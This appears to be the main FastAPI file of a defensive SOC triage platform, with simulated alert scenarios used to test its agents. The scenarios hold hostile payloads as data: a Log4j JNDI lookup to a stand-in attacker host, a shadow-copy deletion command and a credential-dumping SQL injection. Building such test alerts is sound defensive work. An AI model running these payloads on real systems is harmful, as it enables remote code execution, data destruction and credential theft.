import asyncio
import json
import uuid
from datetime import datetime
from typing import Dict, Any, List, Optional
from fastapi import FastAPI, HTTPException, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse
from pydantic import BaseModel

from app.config import settings
from app.models.schemas import SecurityAlert, HITLAction, ActionStatus
from app.agents.graph import soc_agent_graph
from app.agents.remediation import execute_remediation
from app.db.database import (
    get_all_incidents,
    get_incident_by_id,
    get_audit_logs,
    save_incident,
    SessionLocal,
    IncidentRecord,
    AuditLogRecord,
    PatternMemoryRecord
)
from app.llm.engine import llm_engine

app = FastAPI(
    title="SentinelAgent SOC API",
    description="Autonomous Multi-Agent SOC Triage and Incident Response Platform",
    version="1.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory store for real-time SSE stream events
STREAM_QUEUES: Dict[str, asyncio.Queue] = {}

class HITLApprovalPayload(BaseModel):
    action_id: str
    decision: str  # "APPROVE" or "DENY"
    analyst_name: str = "Analyst-Lead"
    notes: Optional[str] = None

class SimulationPayload(BaseModel):
    scenario: str  # "log4j", "ransomware", "bruteforce", "sqli", "benign_scan"

PREDEFINED_SCENARIOS = {
    "log4j": {
        "id": "alt_log4j_99",
        "source_ip": "198.51.100.4",
        "destination_ip": "10.0.1.42",
        "destination_port": 443,
        "protocol": "TCP",
        "alert_type": "Log4j RCE",
        "signature": "ET EXPLOIT Apache log4j CVE-2021-44228 JNDI Outbound LDAP",
        "payload_sample": "${jndi:ldap://198.51.100.4:1389/Exploit}",
        "packet_count": 88,
        "failed_attempts": 0
    },
    "ransomware": {
        "id": "alt_ransom_12",
        "source_ip": "91.240.118.23",
        "destination_ip": "10.0.2.15",
        "destination_port": 445,
        "protocol": "TCP",
        "alert_type": "Ransomware Lateral Movement",
        "signature": "ET ATTACK_RESPONSE Mimikatz credential dump via SMB named pipe",
        "payload_sample": "cmd.exe /c powershell -enc JABzAD0... vssadmin delete shadows /all /quiet",
        "packet_count": 340,
        "failed_attempts": 14
    },
    "bruteforce": {
        "id": "alt_ssh_77",
        "source_ip": "185.220.101.5",
        "destination_ip": "10.0.0.10",
        "destination_port": 22,
        "protocol": "TCP",
        "alert_type": "SSH Brute Force",
        "signature": "SSH Multiple Failed Authentication Attempts from Single IP",
        "payload_sample": "Failed password for invalid user root from port 52311 ssh2",
        "packet_count": 280,
        "failed_attempts": 92
    },
    "sqli": {
        "id": "alt_sqli_34",
        "source_ip": "45.154.255.89",
        "destination_ip": "10.0.3.8",
        "destination_port": 80,
        "protocol": "TCP",
        "alert_type": "SQL Injection Admin Dump",
        "signature": "ET WEB_SPECIFIC_APPS SQL Injection UNION SELECT admin credentials",
        "payload_sample": "admin' UNION SELECT username, password_hash FROM users--",
        "packet_count": 145,
        "failed_attempts": 5
    },
    "benign_scan": {
        "id": "alt_scan_03",
        "source_ip": "10.0.0.15",
        "destination_ip": "10.0.0.88",
        "destination_port": 80,
        "protocol": "TCP",
        "alert_type": "Benign Port Scan",
        "signature": "TCP SYN Half-Open Port Scan internal vulnerability scanner",
        "payload_sample": "SYN flag set window 1024 nmap",
        "packet_count": 12,
        "failed_attempts": 0
    }
}

@app.post("/api/settings/toggle-mode")
async def toggle_llm_mode(payload: Dict[str, Any]):
    enable_live = payload.get("enable_live_llm", False)
    llm_engine.set_live_mode(enable_live)
    return {
        "message": f"LLM mode updated to {'LIVE_CLOUD' if enable_live else 'SMART_LOCAL'}",
        "status": llm_engine.get_status()
    }

@app.get("/api/status")
async def get_system_status():

    db = SessionLocal()
    try:
        incidents_count = db.query(IncidentRecord).count()
        audit_count = db.query(AuditLogRecord).count()
        patterns_count = db.query(PatternMemoryRecord).count()
        pending_hitl_count = db.query(IncidentRecord).filter(IncidentRecord.status == "ESCALATED_TO_HUMAN").count()
    finally:
        db.close()

    llm_info = llm_engine.get_status()
    return {
        "status": "ONLINE",
        "agent_name": "SentinelAgent SOC Core",
        "llm_engine": llm_info,
        "metrics": {
            "total_incidents": incidents_count,
            "audit_entries": audit_count,
            "patterns_memorized": patterns_count,
            "pending_hitl_actions": pending_hitl_count
        },
        "timestamp": datetime.utcnow().isoformat()
    }

@app.post("/api/alerts/ingest")
async def ingest_alert(alert: SecurityAlert):
    incident_id = f"inc_{uuid.uuid4().hex[:8]}"
    initial_state = {
        "incident_id": incident_id,
        "alert": alert.dict(),
        "timeline": [],
        "trace_events": []
    }

    # Execute LangGraph pipeline
    final_state = await soc_agent_graph.ainvoke(initial_state)
    return {
        "incident_id": incident_id,
        "status": final_state["status"],
        "final_severity": final_state["synthesis"]["final_severity"],
        "hitl_required": final_state["hitl_required"],
        "audit_hash": final_state["audit_hash"],
        "trace_events": final_state["trace_events"]
    }

@app.post("/api/simulation/inject")
async def inject_scenario(payload: SimulationPayload):
    scen_key = payload.scenario.lower()
    if scen_key not in PREDEFINED_SCENARIOS:
        raise HTTPException(status_code=400, detail=f"Unknown scenario. Available: {list(PREDEFINED_SCENARIOS.keys())}")

    raw = PREDEFINED_SCENARIOS[scen_key].copy()
    raw["id"] = f"alt_{scen_key}_{uuid.uuid4().hex[:4]}"
    alert = SecurityAlert(**raw)

    incident_id = f"inc_{uuid.uuid4().hex[:8]}"
    initial_state = {
        "incident_id": incident_id,
        "alert": alert.dict(),
        "timeline": [],
        "trace_events": []
    }

    final_state = await soc_agent_graph.ainvoke(initial_state)
    return {
        "scenario": scen_key,
        "incident_id": incident_id,
        "status": final_state["status"],
        "final_severity": final_state["synthesis"]["final_severity"],
        "hitl_required": final_state["hitl_required"],
        "actions": final_state.get("executed_actions") or final_state.get("proposed_actions", []),
        "audit_hash": final_state["audit_hash"],
        "trace_events": final_state["trace_events"]
    }

@app.get("/api/incidents")
async def list_incidents():
    return get_all_incidents()

@app.get("/api/incidents/{incident_id}")
async def get_incident(incident_id: str):
    inc = get_incident_by_id(incident_id)
    if not inc:
        raise HTTPException(status_code=404, detail="Incident not found")
    return inc

@app.post("/api/hitl/{incident_id}/action")
async def handle_hitl_action(incident_id: str, payload: HITLApprovalPayload):
    inc = get_incident_by_id(incident_id)
    if not inc:
        raise HTTPException(status_code=404, detail="Incident not found")

    actions = inc.get("remediation_actions", [])
    target_action = None
    for act in actions:
        if act.get("id") == payload.action_id or not payload.action_id:
            target_action = act
            break

    if not target_action:
        raise HTTPException(status_code=404, detail="Action not found in incident")

    db = SessionLocal()
    try:
        rec = db.query(IncidentRecord).filter(IncidentRecord.id == incident_id).first()
        if not rec:
            raise HTTPException(status_code=404, detail="Record not found")

        now = datetime.utcnow().isoformat()
        if payload.decision.upper() == "APPROVE":
            # Execute the approved remediation
            executed = execute_remediation(target_action, actor=f"HUMAN:{payload.analyst_name}")
            target_action["status"] = "APPROVED"
            target_action["execution_log"] = executed.get("execution_log")
            rec.status = "REMEDIATED_APPROVED"
        else:
            target_action["status"] = "DENIED"
            target_action["resolved_at"] = now
            target_action["resolved_by"] = f"HUMAN:{payload.analyst_name}"
            rec.status = "REMEDIATION_DENIED"

        current_timeline = json.loads(rec.timeline) if rec.timeline else []
        current_timeline.append(f"[{now}] Human Analyst '{payload.analyst_name}' {payload.decision.upper()} action {target_action['action_type']}. Notes: {payload.notes or 'None'}")
        
        rec.timeline = json.dumps(current_timeline)
        rec.remediation_actions = json.dumps(actions, default=str)
        db.commit()

        return {
            "status": "UPDATED",
            "incident_id": incident_id,
            "decision": payload.decision.upper(),
            "action": target_action
        }
    finally:
        db.close()

@app.get("/api/audit-logs")
async def list_audit_logs():
    return get_audit_logs()

@app.get("/api/stream/investigation/{incident_id}")
async def stream_investigation(incident_id: str):
    """Server-Sent Events (SSE) streaming endpoint for live UI visualization."""
    async def event_generator():
        inc = get_incident_by_id(incident_id)
        if not inc:
            yield f"data: {json.dumps({'error': 'Incident not found'})}\n\n"
            return

        steps = inc.get("investigation_steps", [])
        for step in steps:
            yield f"data: {json.dumps({'type': 'STEP', 'data': step})}\n\n"
            await asyncio.sleep(0.3)

        yield f"data: {json.dumps({'type': 'COMPLETE', 'status': inc['status'], 'final_severity': inc['final_severity']})}\n\n"

    return StreamingResponse(event_generator(), media_type="text/event-stream")

# Add evaluation endpoint (delegates to eval harness)
@app.post("/api/eval/run")
async def run_evaluation():
    from app.eval.eval_harness import evaluate_all_incidents
    results = await evaluate_all_incidents()
    return results

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app.main:app", host=settings.HOST, port=settings.PORT, reload=True)
